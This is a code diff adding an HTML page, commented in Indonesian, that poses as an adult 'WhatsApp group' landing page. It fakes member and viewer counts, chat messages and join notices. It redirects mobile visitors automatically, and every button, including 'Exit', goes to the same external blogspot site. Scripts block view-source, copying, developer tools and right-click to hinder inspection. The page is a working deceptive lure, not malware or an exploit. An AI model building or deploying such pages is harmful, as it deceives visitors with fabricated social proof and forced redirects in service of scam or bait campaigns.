@@ -1,0 +1,1046 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<script>
+// Blok Ctrl+U, Ctrl+S, Ctrl+C
+document.addEventListener('keydown', function(e) {
+    if (
+        (e.ctrlKey && e.key.toLowerCase() === 'u') ||
+        (e.ctrlKey && e.key.toLowerCase() === 's') ||
+        (e.ctrlKey && e.key.toLowerCase() === 'c')
+    ) {
+        e.preventDefault();
+        alert("Akses diblokir!");
+    }
+
+    // Blok F12
+    if (e.key === "F12") {
+        e.preventDefault();
+        alert("Developer Tools diblokir!");
+    }
+});
+
+// Blok klik kanan
+document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+});
+</script>
+
+<style>
+body{
+    user-select:none;
+    -webkit-user-select:none;
+    -moz-user-select:none;
+    -ms-user-select:none;
+}
+</style>
+<script>
+  // Simple mobile detection
+  if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
+    setTimeout(function() {
+      window.location.href = "https://hownowdate.blogspot.com/";
+    }, 3000); // 3000 milliseconds = 3 seconds
+  }
+</script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Naughty Girls Room</title>
+
+    <!-- Open Graph -->
+    <meta property="og:title" content="My private WhatsApp 💞" />
+    <meta property="og:image" content="https://img.lightshot.app/qU_HZ9ZTQmShKfxgYkguzw.png" />
+    <meta property="og:type" content="website" />
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+
+    <style>
+        /* ── RESET & BASE ── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            overflow: hidden;
+            color: #fff;
+            height: 100vh;
+            background: #0b0b12;
+            user-select: none;
+        }
+
+        /* ── VIDEO BACKGROUND ── */
+        .bg-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            transition: opacity 0.6s ease;
+        }
+
+        /* ── OVERLAY GRADIENT ── */
+        .video-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            background:
+                radial-gradient(ellipse at 30% 20%, rgba(180, 40, 200, 0.25) 0%, transparent 60%),
+                radial-gradient(ellipse at 70% 80%, rgba(0, 200, 255, 0.15) 0%, transparent 50%),
+                rgba(0, 0, 0, 0.55);
+        }
+
+        /* ── PARTIKEL CANVAS ── */
+        #particles-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        /* ── SEMUA KONTEN DI ATAS PARTIKEL ── */
+        .content-wrapper {
+            position: relative;
+            z-index: 1;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ── HEADER ── */
+        .whatsapp-header {
+            display: flex;
+            align-items: center;
+            padding: 12px 18px;
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            flex-shrink: 0;
+        }
+        .whatsapp-header i {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 18px;
+        }
+        .header-info {
+            margin-left: 12px;
+        }
+        .header-info b {
+            font-size: 16px;
+            letter-spacing: 0.3px;
+            background: linear-gradient(135deg, #f093fb, #f5576c, #4facfe);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .header-info small {
+            font-size: 11px;
+            opacity: 0.6;
+            display: block;
+            margin-top: 1px;
+        }
+
+        /* ── LIVE BADGE ── */
+        .live-badge {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            background: rgba(255, 0, 0, 0.2);
+            padding: 4px 14px 4px 10px;
+            border-radius: 30px;
+            border: 1px solid rgba(255, 50, 50, 0.3);
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #ff6b6b;
+            animation: livePulse 1.8s ease-in-out infinite;
+        }
+        .live-badge .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff3333;
+            animation: dotBlink 1s ease-in-out infinite;
+            box-shadow: 0 0 12px rgba(255, 0, 0, 0.6);
+        }
+        @keyframes dotBlink {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.3;
+                transform: scale(0.7);
+            }
+        }
+        @keyframes livePulse {
+            0%,
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 50, 50, 0.2);
+            }
+            50% {
+                box-shadow: 0 0 20px 6px rgba(255, 50, 50, 0.05);
+            }
+        }
+
+        /* ── KONTEN TENGAH ── */
+        .blur-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 16px 10px;
+            text-align: center;
+        }
+
+        .group-title {
+            font-size: 26px;
+            font-weight: 800;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #f093fb, #f5576c, #4facfe, #43e97b);
+            background-size: 300% 300%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: gradShift 4s ease-in-out infinite;
+            text-shadow: 0 0 40px rgba(245, 87, 108, 0.15);
+            margin-bottom: 4px;
+        }
+        @keyframes gradShift {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        .sub-title {
+            font-size: 13px;
+            opacity: 0.7;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+            margin-bottom: 18px;
+        }
+        .sub-title span {
+            color: #f5576c;
+            font-weight: 600;
+        }
+
+        /* ── STATS ── */
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 6px 0 14px;
+        }
+        .stat-item {
+            text-align: center;
+        }
+        .stat-item .number {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, #c8d6e5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 0.5px;
+        }
+        .stat-item .label {
+            font-size: 11px;
+            opacity: 0.5;
+            margin-top: 2px;
+            letter-spacing: 0.3px;
+        }
+        .stat-item .label .fa-circle {
+            color: #00ff6a;
+            font-size: 7px;
+            margin-right: 4px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.2;
+            }
+        }
+
+        .viewer-count {
+            font-size: 13px;
+            opacity: 0.6;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 5px 18px;
+            border-radius: 30px;
+            backdrop-filter: blur(4px);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            margin-top: 2px;
+        }
+        .viewer-count b {
+            color: #fff;
+            font-weight: 700;
+        }
+
+        /* ── TOMBOL DENGAN EFEK HIDUP ── */
+        .sticky-buttons {
+            flex-shrink: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px 16px 24px;
+            gap: 8px;
+            width: 100%;
+        }
+
+        .btn {
+            min-width: 200px;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 60px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            max-width: 320px;
+            letter-spacing: 0.3px;
+            transform: translateX(0);
+            animation: none;
+            will-change: transform, box-shadow;
+        }
+
+        /* Efek ikon berdenyut terus-menerus */
+        .btn i {
+            font-size: 18px;
+            transition: transform 0.3s ease;
+            animation: iconPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes iconPulse {
+            0%,
+            100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.15);
+            }
+        }
+
+        /* Efek pulse pada tombol (glow) */
+        @keyframes glowPulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0);
+            }
+            50% {
+                box-shadow: 0 0 20px 5px rgba(255, 255, 255, 0.1);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 255, 255, 0);
+            }
+        }
+
+        .btn:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
+        }
+        .btn:hover i {
+            animation: none;
+            transform: scale(1.25) rotate(-4deg);
+        }
+        .btn:active {
+            transform: scale(0.95);
+        }
+
+        /* Tombol WhatsApp */
+        .btn-wa {
+            background: rgba(37, 211, 102, 0.85);
+            box-shadow: 0 4px 25px rgba(37, 211, 102, 0.3);
+            animation: waGlow 2.5s ease-in-out infinite;
+        }
+        .btn-wa:hover {
+            background: rgba(37, 211, 102, 1);
+            box-shadow: 0 8px 40px rgba(37, 211, 102, 0.5);
+        }
+        @keyframes waGlow {
+            0%,
+            100% {
+                box-shadow: 0 4px 25px rgba(37, 211, 102, 0.3);
+            }
+            50% {
+                box-shadow: 0 4px 35px rgba(37, 211, 102, 0.6);
+            }
+        }
+
+        /* Tombol TikTok */
+        .btn-tiktok {
+            background: rgba(0, 0, 0, 0.75);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 4px 25px rgba(255, 255, 255, 0.03);
+            animation: tiktokGlow 2.5s ease-in-out infinite;
+        }
+        .btn-tiktok:hover {
+            background: rgba(0, 0, 0, 0.9);
+            box-shadow: 0 8px 40px rgba(255, 255, 255, 0.08);
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+        @keyframes tiktokGlow {
+            0%,
+            100% {
+                box-shadow: 0 4px 25px rgba(255, 255, 255, 0.03);
+            }
+            50% {
+                box-shadow: 0 4px 35px rgba(255, 255, 255, 0.1);
+            }
+        }
+
+        /* Tombol Telegram */
+        .btn-telegram {
+            background: rgba(0, 136, 204, 0.8);
+            box-shadow: 0 4px 25px rgba(0, 136, 204, 0.25);
+            animation: telegramGlow 2.5s ease-in-out infinite;
+        }
+        .btn-telegram:hover {
+            background: rgba(0, 136, 204, 0.95);
+            box-shadow: 0 8px 40px rgba(0, 136, 204, 0.5);
+        }
+        @keyframes telegramGlow {
+            0%,
+            100% {
+                box-shadow: 0 4px 25px rgba(0, 136, 204, 0.25);
+            }
+            50% {
+                box-shadow: 0 4px 35px rgba(0, 136, 204, 0.5);
+            }
+        }
+
+        /* Tombol Exit */
+        .btn-exit {
+            background: rgba(255, 45, 45, 0.75);
+            box-shadow: 0 4px 25px rgba(255, 45, 45, 0.2);
+            animation: exitGlow 2.5s ease-in-out infinite;
+        }
+        .btn-exit:hover {
+            background: rgba(255, 45, 45, 0.95);
+            box-shadow: 0 8px 40px rgba(255, 45, 45, 0.4);
+        }
+        @keyframes exitGlow {
+            0%,
+            100% {
+                box-shadow: 0 4px 25px rgba(255, 45, 45, 0.2);
+            }
+            50% {
+                box-shadow: 0 4px 35px rgba(255, 45, 45, 0.5);
+            }
+        }
+
+        /* Efek ripple pada tombol */
+        .btn .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.25);
+            transform: scale(0);
+            animation: rippleAnim 0.7s ease-out forwards;
+            pointer-events: none;
+        }
+        @keyframes rippleAnim {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        /* ── CHAT BUBBLE ── */
+        .chat-container {
+            position: fixed;
+            left: 14px;
+            bottom: 280px;
+            z-index: 2;
+            max-width: 260px;
+            pointer-events: none;
+        }
+
+        .chat-bubble {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 6px 10px 6px 6px;
+            border-radius: 14px;
+            margin-bottom: 5px;
+            font-size: 12px;
+            color: #eee;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            animation: slideIn 0.35s ease;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            transition: opacity 0.3s;
+        }
+        .chat-bubble .chat-avatar {
+            width: 26px;
+            height: 26px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 1.5px solid rgba(255, 255, 255, 0.1);
+            flex-shrink: 0;
+        }
+        .chat-bubble .chat-name {
+            font-weight: 600;
+            font-size: 11px;
+            color: #f093fb;
+        }
+        .chat-bubble .chat-msg {
+            font-size: 11.5px;
+            opacity: 0.9;
+        }
+        .chat-bubble .typing-dots {
+            display: inline-flex;
+            gap: 3px;
+            align-items: center;
+            margin-left: 4px;
+        }
+        .chat-bubble .typing-dots span {
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            animation: typingBounce 1.2s infinite ease-in-out;
+        }
+        .chat-bubble .typing-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .chat-bubble .typing-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        @keyframes typingBounce {
+            0%,
+            60%,
+            100% {
+                transform: translateY(0);
+                opacity: 0.3;
+            }
+            30% {
+                transform: translateY(-5px);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0) scale(1);
+            }
+        }
+
+        /* ── FLOATING EMOJI ── */
+        .float-container {
+            position: fixed;
+            right: 12px;
+            bottom: 120px;
+            z-index: 2;
+            pointer-events: none;
+            width: 80px;
+            height: 300px;
+        }
+        .float-item {
+            position: absolute;
+            animation: floatUp 3.2s ease-out forwards;
+            font-size: 22px;
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.3));
+            opacity: 0;
+        }
+        @keyframes floatUp {
+            0% {
+                transform: translateY(0) scale(0.3) rotate(0deg);
+                opacity: 0;
+            }
+            15% {
+                opacity: 1;
+                transform: translateY(-20px) scale(1) rotate(10deg);
+            }
+            100% {
+                transform: translateY(-320px) scale(0.8) rotate(-20deg);
+                opacity: 0;
+            }
+        }
+
+        /* ── NOTIFIKASI MEMBER BARU ── */
+        .notif-toast {
+            position: fixed;
+            bottom: 260px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 3;
+            background: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #ccc;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            animation: toastIn 0.5s ease, toastOut 0.5s ease 2.5s forwards;
+            pointer-events: none;
+            white-space: nowrap;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+        }
+        .notif-toast strong {
+            color: #f093fb;
+            font-weight: 600;
+        }
+        @keyframes toastIn {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px) scale(0.9);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0) scale(1);
+            }
+        }
+        @keyframes toastOut {
+            from {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0) scale(1);
+            }
+            to {
+                opacity: 0;
+                transform: translateX(-50%) translateY(-20px) scale(0.9);
+            }
+        }
+
+        /* ── RESPONSIVE ── */
+        @media (max-width: 480px) {
+            .group-title {
+                font-size: 20px;
+            }
+            .stats {
+                gap: 24px;
+            }
+            .stat-item .number {
+                font-size: 20px;
+            }
+            .btn {
+                max-width: 280px;
+                padding: 12px 16px;
+                font-size: 14px;
+                min-width: unset;
+            }
+            .chat-container {
+                left: 8px;
+                bottom: 250px;
+                max-width: 200px;
+            }
+            .chat-bubble {
+                font-size: 10.5px;
+                padding: 4px 8px 4px 4px;
+            }
+            .chat-bubble .chat-avatar {
+                width: 20px;
+                height: 20px;
+            }
+            .live-badge {
+                font-size: 9px;
+                padding: 3px 10px 3px 8px;
+            }
+            .live-badge .dot {
+                width: 6px;
+                height: 6px;
+            }
+            .float-container {
+                right: 6px;
+                bottom: 100px;
+                width: 60px;
+                height: 200px;
+            }
+            .float-item {
+                font-size: 18px;
+            }
+            .viewer-count {
+                font-size: 11px;
+                padding: 4px 14px;
+            }
+        }
+
+        @media (max-width: 380px) {
+            .group-title {
+                font-size: 17px;
+            }
+            .stats {
+                gap: 16px;
+            }
+            .stat-item .number {
+                font-size: 17px;
+            }
+            .btn {
+                max-width: 240px;
+                font-size: 12.5px;
+                padding: 10px 14px;
+                gap: 6px;
+            }
+            .btn i {
+                font-size: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- VIDEO -->
+    <video class="bg-video" autoplay muted loop id="bgVideo"></video>
+
+    <!-- OVERLAY GRADIENT -->
+    <div class="video-overlay"></div>
+
+    <!-- PARTIKEL CANVAS -->
+    <canvas id="particles-canvas"></canvas>
+
+    <!-- WRAPPER KONTEN -->
+    <div class="content-wrapper">
+
+        <!-- HEADER -->
+        <div class="whatsapp-header">
+            <i class="fas fa-arrow-left"></i>
+            <div class="header-info">
+                <b>Naughty Girls Room</b>
+                <small>WhatsApp Group</small>
+            </div>
+            <div class="live-badge">
+                <span class="dot"></span>
+                LIVE
+            </div>
+        </div>
+
+        <!-- KONTEN TENGAH -->
+        <div class="blur-content">
+            <div class="group-title">Ｎａｕｇｈｔｙ Ｇｉｒｌｓ Ｒｏｏｍ</div>
+            <div class="sub-title">Admin &amp; Moderator: <span>Emily Whitney</span></div>
+
+            <div class="stats">
+                <div class="stat-item">
+                    <div class="number" id="members">130,707</div>
+                    <div class="label">Members</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number" id="online">50,856</div>
+                    <div class="label"><i class="fas fa-circle"></i> Online</div>
+                </div>
+            </div>
+
+            <div class="viewer-count">
+                👁 <b id="viewer">1287</b> watching now
+            </div>
+        </div>
+
+        <!-- TOMBOL -->
+        <div class="sticky-buttons">
+            <button class="btn btn-wa" onclick="window.location.replace('https://hownowdate.blogspot.com/')">
+                <i class="fab fa-whatsapp"></i> Join WhatsApp
+            </button>
+            <button class="btn btn-tiktok" onclick="window.location.replace('https://hownowdate.blogspot.com/')">
+                <i class="fab fa-tiktok"></i> Follow TikTok
+            </button>
+            <button class="btn btn-telegram" onclick="openLink('https://hownowdate.blogspot.com/')">
+                <i class="fab fa-telegram"></i> Join Telegram
+            </button>
+            <button class="btn btn-exit" onclick="window.location.replace('https://hownowdate.blogspot.com/')">
+                <i class="fas fa-times"></i> Exit
+            </button>
+        </div>
+
+    </div>
+
+    <!-- CHAT -->
+    <div class="chat-container" id="chatContainer"></div>
+
+    <!-- FLOATING EMOJI -->
+    <div class="float-container" id="floatContainer"></div>
+
+    <script>
+        // ── HELPERS ──
+        function openLink(url) {
+            window.open(url, '_blank');
+        }
+
+        // ── VIDEO BARU (5 video) ──
+        const vids = [
+            'https://thumbsnap.com/i/WKYssMJi.mp4',
+            'https://thumbsnap.com/i/fCartP7X.mp4',
+            'https://thumbsnap.com/i/w924zDa8.mp4',
+            'https://thumbsnap.com/i/JzHiwMBd.mp4',
+            'https://thumbsnap.com/i/zK3sp3Vv.mp4'
+        ];
+
+        const video = document.getElementById('bgVideo');
+        let currentIndex = 0;
+
+        // Fungsi untuk mengganti video
+        function changeVideo(index) {
+            video.style.opacity = 0;
+            setTimeout(() => {
+                video.src = vids[index];
+                video.play();
+                video.style.opacity = 1;
+            }, 350);
+        }
+
+        // Mulai dengan video pertama
+        changeVideo(0);
+
+        // Interval ganti video setiap 7 detik (loop tanpa batas)
+        setInterval(() => {
+            currentIndex = (currentIndex + 1) % vids.length;
+            changeVideo(currentIndex);
+        }, 7000);
+
+        // ── COUNTER ──
+        let viewer = 1287,
+            members = 130707,
+            online = 50856;
+
+        function formatNum(n) { return n.toLocaleString(); }
+
+        function updateCounters() {
+            viewer += Math.random() > 0.5 ? Math.floor(Math.random() * 5) + 1 : -Math.floor(Math.random() * 4);
+            members += Math.floor(Math.random() * 4) + 1;
+            online += Math.random() > 0.5 ? Math.floor(Math.random() * 4) + 1 : -Math.floor(Math.random() * 3);
+
+            if (viewer < 800) viewer = 800;
+            if (online < 20000) online = 20000;
+            if (members < 120000) members = 120000;
+
+            document.getElementById('viewer').textContent = viewer;
+            document.getElementById('members').textContent = formatNum(members);
+            document.getElementById('online').textContent = formatNum(online);
+        }
+        setInterval(updateCounters, 1800);
+
+        // ── PARTIKEL ──
+        const canvas = document.getElementById('particles-canvas');
+        const ctx = canvas.getContext('2d');
+        let W, H;
+        const particles = [];
+        const PARTICLE_COUNT = 70;
+
+        function resizeCanvas() {
+            W = canvas.width = window.innerWidth;
+            H = canvas.height = window.innerHeight;
+        }
+        window.addEventListener('resize', resizeCanvas);
+        resizeCanvas();
+
+        class Particle {
+            constructor() { this.reset(); }
+            reset() {
+                this.x = Math.random() * W;
+                this.y = Math.random() * H;
+                this.size = Math.random() * 2 + 0.5;
+                this.speedX = (Math.random() - 0.5) * 0.3;
+                this.speedY = (Math.random() - 0.5) * 0.3 - 0.08;
+                this.opacity = Math.random() * 0.5 + 0.1;
+            }
+            update() {
+                this.x += this.speedX;
+                this.y += this.speedY;
+                if (this.x < 0 || this.x > W || this.y < 0 || this.y > H) this.reset();
+            }
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(255,255,255,${this.opacity})`;
+                ctx.fill();
+                ctx.shadowColor = 'rgba(180,40,200,0.15)';
+                ctx.shadowBlur = 6;
+                ctx.fill();
+                ctx.shadowBlur = 0;
+            }
+        }
+
+        for (let i = 0; i < PARTICLE_COUNT; i++) {
+            particles.push(new Particle());
+        }
+
+        function drawParticles() {
+            ctx.clearRect(0, 0, W, H);
+            particles.forEach(p => { p.update();
+                p.draw(); });
+            for (let i = 0; i < particles.length; i++) {
+                for (let j = i + 1; j < particles.length; j++) {
+                    const dx = particles[i].x - particles[j].x;
+                    const dy = particles[i].y - particles[j].y;
+                    const dist = Math.sqrt(dx * dx + dy * dy);
+                    if (dist < 120) {
+                        ctx.beginPath();
+                        ctx.moveTo(particles[i].x, particles[i].y);
+                        ctx.lineTo(particles[j].x, particles[j].y);
+                        ctx.strokeStyle = `rgba(255,255,255,${0.04 * (1 - dist / 120)})`;
+                        ctx.lineWidth = 0.5;
+                        ctx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(drawParticles);
+        }
+        drawParticles();
+
+        // ── CHAT ──
+        const users = [
+            { n: 'Emma', a: 'https://randomuser.me/api/portraits/women/21.jpg' },
+            { n: 'Olivia', a: 'https://randomuser.me/api/portraits/women/22.jpg' },
+            { n: 'Ava', a: 'https://randomuser.me/api/portraits/women/23.jpg' },
+            { n: 'Sophia', a: 'https://randomuser.me/api/portraits/women/24.jpg' },
+            { n: 'Isabella', a: 'https://randomuser.me/api/portraits/women/25.jpg' },
+            { n: 'Mia', a: 'https://randomuser.me/api/portraits/women/26.jpg' },
+            { n: 'Charlotte', a: 'https://randomuser.me/api/portraits/women/27.jpg' },
+            { n: 'Amelia', a: 'https://randomuser.me/api/portraits/women/28.jpg' },
+            { n: 'Harper', a: 'https://randomuser.me/api/portraits/women/29.jpg' },
+            { n: 'Evelyn', a: 'https://randomuser.me/api/portraits/women/30.jpg' },
+            { n: 'James', a: 'https://randomuser.me/api/portraits/men/21.jpg' },
+            { n: 'John', a: 'https://randomuser.me/api/portraits/men/22.jpg' },
+            { n: 'Robert', a: 'https://randomuser.me/api/portraits/men/23.jpg' },
+            { n: 'Michael', a: 'https://randomuser.me/api/portraits/men/24.jpg' },
+            { n: 'William', a: 'https://randomuser.me/api/portraits/men/25.jpg' },
+            { n: 'David', a: 'https://randomuser.me/api/portraits/men/26.jpg' },
+            { n: 'Richard', a: 'https://randomuser.me/api/portraits/men/27.jpg' },
+            { n: 'Joseph', a: 'https://randomuser.me/api/portraits/men/28.jpg' },
+            { n: 'Thomas', a: 'https://randomuser.me/api/portraits/men/29.jpg' },
+            { n: 'Charles', a: 'https://randomuser.me/api/portraits/men/30.jpg' }
+        ];
+
+        const msgs = [
+            'Just joined 🔥', 'Anyone here? 😅', 'Wow active 😳',
+            'Crazy group 🔥', 'Hello 👋', 'Nice 😍', 'Active chat!',
+            'Love this 😈', 'Hii 🙈', 'Let\'s gooo 🚀', 'So fun!',
+            'Best group ever ✨', 'Hahaha 😂', 'I\'m new!',
+            'Who\'s online?', '🔥🔥🔥', 'Good vibes only'
+        ];
+
+        const chatContainer = document.getElementById('chatContainer');
+
+        setInterval(() => {
+            const u = users[Math.floor(Math.random() * users.length)];
+            const msg = msgs[Math.floor(Math.random() * msgs.length)];
+
+            const bubble = document.createElement('div');
+            bubble.className = 'chat-bubble';
+            bubble.innerHTML = `
+            <img src="${u.a}" class="chat-avatar" alt="">
+            <div>
+              <div class="chat-name">${u.n}</div>
+              <div style="display:flex;align-items:center;gap:4px;">
+                <span style="opacity:0.6;font-size:11px;">typing</span>
+                <span class="typing-dots">
+                  <span></span><span></span><span></span>
+                </span>
+              </div>
+            </div>
+          `;
+            chatContainer.prepend(bubble);
+
+            setTimeout(() => {
+                bubble.innerHTML = `
+              <img src="${u.a}" class="chat-avatar" alt="">
+              <div>
+                <div class="chat-name">${u.n}</div>
+                <div class="chat-msg">${msg}</div>
+              </div>
+            `;
+            }, 700);
+
+            if (chatContainer.children.length > 5) {
+                chatContainer.lastChild.remove();
+            }
+        }, 900);
+
+        // ── NOTIF MEMBER BARU ──
+        const names = ['Luna', 'Mila', 'Zara', 'Nova', 'Rara', 'Ivy', 'Aura', 'Ella', 'Sophie', 'Layla', 'Zayn', 'Leo', 'Felix',
+            'Kai', 'Ezra', 'Milo', 'Arlo', 'Jax', 'Finn', 'Theo'
+        ];
+
+        function showNewMember() {
+            const name = names[Math.floor(Math.random() * names.length)];
+            const toast = document.createElement('div');
+            toast.className = 'notif-toast';
+            toast.innerHTML = `✨ <strong>${name}</strong> just joined the room!`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        setInterval(() => {
+            if (Math.random() > 0.45) showNewMember();
+        }, 5500);
+
+        // ── FLOATING EMOJI ──
+        const emojis = ['❤️', '🔥', '😍', '💋', '😈', '🥵', '💦', '✨', '🌟', '💕', '🌸', '🌺', '⭐', '🎉', '💫', '🌈', '💖', '🍑', '😘',
+            '💎'
+        ];
+        const floatContainer = document.getElementById('floatContainer');
+
+        setInterval(() => {
+            const el = document.createElement('div');
+            el.className = 'float-item';
+            el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+            el.style.left = Math.random() * 70 + '%';
+            el.style.fontSize = (16 + Math.random() * 18) + 'px';
+            el.style.animationDuration = (2.6 + Math.random() * 1.4) + 's';
+            floatContainer.appendChild(el);
+            setTimeout(() => el.remove(), 4000);
+        }, 260);
+
+        // ── RIPPLE EFFECT ──
+        document.querySelectorAll('.btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                const rect = this.getBoundingClientRect();
+                const ripple = document.createElement('span');
+                ripple.className = 'ripple';
+                const size = Math.max(rect.width, rect.height);
+                ripple.style.width = ripple.style.height = size + 'px';
+                ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
+                ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
+                this.appendChild(ripple);
+                setTimeout(() => ripple.remove(), 700);
+            });
+        });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon='{"version":"2024.11.0","token":"eb6f77685b2f445f8d3dde7f516f67d5","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<h1>Website Dilindungi</h1>
+<p>Ctrl+U, Ctrl+C, Ctrl+S, F12, dan klik kanan diblokir.</p>
+</body>
+</html>
+</html>
